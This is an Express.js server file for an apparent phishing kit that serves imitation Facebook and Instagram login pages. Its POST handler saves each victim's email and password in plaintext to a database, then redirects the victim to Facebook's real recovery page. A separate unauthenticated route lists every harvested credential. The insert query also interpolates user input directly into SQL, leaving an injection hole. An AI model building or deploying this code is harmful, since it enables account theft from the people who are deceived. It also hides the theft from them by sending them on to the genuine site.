const express = require('express');
const app = express();
const path = require('path');

const db = require('../models/db');
const port = 3000;

app.use(express.urlencoded());

app.set('view engine', 'ejs');

app.get('/', function (req, res) {
  // res.json({ message: 200 });
  res.sendFile(path.join(__dirname, '../views/facebook/index.html'));
});

app.get('/api/list-data', async function (req, res) {
  try {
    const result = await db.query('SELECT * FROM users');
    res.json({ message: 200, data: result.rows });
  } catch (err) {
    console.error(err);
    res.status(500).send('Internal Server Error');
  }
});

app.get('/facebook/login', function (req, res) {
  res.render('facebook/index', { title: 'Facebook - Login' });
});

app.post('/facebook/login', async function (req, res) {
  try {
    const { email, password } = req.body;
    await db.query(`INSERT INTO users (email, password) VALUES ('${email}', '${password}')`);
  } catch (err) {
    console.error(err);
    res.status(500).send('Internal Server Error');
  }
  res.redirect('https://facebook.com/recover/initiate/');
});

app.get('/instagram/login', function (req, res) {
  res.render('instagram/index', { title: 'Instagram - Login' });
});

app.listen(port, () => {
  console.log(`Listening on ${port}`);
});
